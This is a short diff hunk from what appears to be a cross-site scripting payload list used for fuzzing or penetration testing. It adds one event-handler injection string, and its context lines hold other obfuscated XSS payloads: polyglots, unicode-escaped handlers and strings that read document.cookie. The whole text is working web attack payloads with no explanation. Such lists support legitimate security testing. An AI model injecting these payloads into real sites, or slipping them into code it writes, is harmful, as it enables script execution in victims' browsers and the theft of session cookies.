@@ -1570,6 +1570,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )
 <video/src=//w3schools.com/tags/movie.mp4%0Aautoplay/onplay=(confirm(1))>
 <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
 <x+oncut=y=prompt,y`1`>xss
+"oncut=%27onmouseover=alert(1)//
 11111';\u006F\u006E\u0065rror=\u0063onfirm; throw'1
 i\{\<\/\s\t\y\le\>\<\i\m\g\20\o\ne\r\r\o\r\=\'a\le\r\t\(d\oc\u\me\nt\.c\o\o\kie\)\'\s\rc\=\'eeeeeee\'\20\>{
 javascript://%250Aalert(document.cookie)
